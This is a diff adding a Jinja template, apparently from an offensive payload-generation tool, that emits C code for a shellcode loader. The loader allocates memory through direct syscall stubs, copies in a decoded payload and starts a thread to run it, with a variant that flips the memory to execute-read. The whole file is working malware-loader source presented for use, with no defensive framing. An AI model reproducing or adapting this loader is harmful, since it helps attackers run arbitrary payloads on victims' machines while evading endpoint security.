@@ -1,0 +1,30 @@
+{% from "macros.jinja" import syscall_call, createThreadStub with context %}
+
+{% if section == "globals" %}
+    {% include "lib/syscalls.jinja" %}
+
+    void *alloc(void *decoded, SIZE_T length){
+        NTSTATUS status;
+        DWORD SyscallId = 0;
+        LPVOID mem = NULL;
+        SIZE_T szWmResv = length;
+
+        {% if protection == "rx" %}
+            {{ syscall_call("ZwAllocateVirtualMemory", "(HANDLE)-1,&mem, NULL,&length,MEM_COMMIT,PAGE_READWRITE") }}
+            memcpy(mem, decoded, length);
+            {{ createThreadStub("local", "mem", "mem") }}
+
+            DWORD oldProt;
+            {{ syscall_call("NtProtectVirtualMemory", "(HANDLE)-1,&mem, &szWmResv,PAGE_EXECUTE_READ,&oldProt") }}
+            return mem;
+        {% else %}
+            {{ syscall_call("ZwAllocateVirtualMemory", "(HANDLE)-1,&mem, NULL,&length,MEM_COMMIT,PAGE_EXECUTE_READWRITE") }}
+            memcpy(mem, decoded, length);
+            {{ createThreadStub("local", "mem", "mem") }}
+            return mem;
+        {% endif %}
+    }
+{% else %}
+    {# Here goes alloc function call #}
+    void *mem = alloc(raw, length);
+{% endif %}
